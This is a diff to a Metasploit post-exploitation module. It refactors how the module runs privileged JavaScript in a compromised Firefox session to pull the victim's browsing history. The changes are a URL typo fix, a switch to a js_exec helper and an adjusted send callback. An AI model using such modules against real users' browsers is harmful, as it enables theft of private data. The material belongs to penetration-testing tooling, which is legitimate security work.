@@ -1,15 +1,13 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'json'
 require 'msf/core'
-require 'msf/core/payload/firefox'
 
 class Metasploit3 < Msf::Post
 
-  include Msf::Payload::Firefox
   include Msf::Exploit::Remote::FirefoxPrivilegeEscalation
 
   def initialize(info={})
@@ -30,9 +28,7 @@ class Metasploit3 < Msf::Post
   end
 
   def run
-    print_status "Running the privileged javascript..."
-    session.shell_write("[JAVASCRIPT]#{js_payload}[/JAVASCRIPT]")
-    results = session.shell_read_until_token("[!JAVASCRIPT]", 0, datastore['TIMEOUT'])
+    results = js_exec(js_payload)
     if results.present?
       begin
         history = JSON.parse(results)
@@ -84,7 +80,7 @@ class Metasploit3 < Msf::Post
         } catch (e) {
           send(e);
         }
-      })(send);
+      })(this.send);
     |.strip
   end
 end
